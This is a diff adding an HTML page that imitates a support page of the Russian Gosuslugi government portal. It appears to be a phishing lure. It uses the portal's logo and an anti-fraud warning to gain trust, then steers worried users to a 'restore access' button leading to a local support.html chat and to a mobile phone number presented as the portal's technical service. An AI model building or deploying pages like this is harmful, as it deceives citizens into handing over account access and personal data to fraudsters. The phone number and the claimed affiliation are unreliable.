@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги</title>
+    <style>
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            background: #f8f9fa;
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .header {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .gosuslugi-logo-img { height: 32px; }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            padding: 24px 20px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        h2 {
+            color: #1a1a2e;
+            margin: 0 0 8px 0;
+            font-size: 20px;
+        }
+
+        .subtitle {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+
+        .info-card {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            line-height: 1.45;
+        }
+
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 13px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+            transition: all 0.3s ease;
+        }
+        .btn:active { transform: scale(0.97); }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Gosuslugi.svg" 
+             alt="Госуслуги" class="gosuslugi-logo-img">
+    </div>
+
+    <div class="container">
+        <h2>Поддержка портала Госуслуг</h2>
+        <p class="subtitle">Перед обращением ознакомьтесь с важной информацией о безопасности.</p>
+
+        <div class="info-card">
+            Служба поддержки Госуслуг не спрашивает пароли и коды доступа, ответы на контрольные вопросы. Если вам позвонили от имени Госуслуг и спросили такие данные, это мошенники.
+        </div>
+
+        <div class="info-card">
+            Проверьте, надежно ли защищена ваша учетная запись: подключите вход с подтверждением и настройте контрольный вопрос.
+        </div>
+
+        <div class="info-card">
+            Если мошенники получили или пытаются получить доступ к вашей учетной записи Госуслуг или к вашим конфиденциальным данным, нажмите «Восстановить доступ» и следуйте инструкциям в чате или совершите звонок в техническую службу Портала Госуслуг: <strong>+7 (960) 533-15-58</strong>.
+        </div>
+
+        <button onclick="window.location.href='support.html'" class="btn">Восстановить доступ</button>
+    </div>
+</body>
+</html>
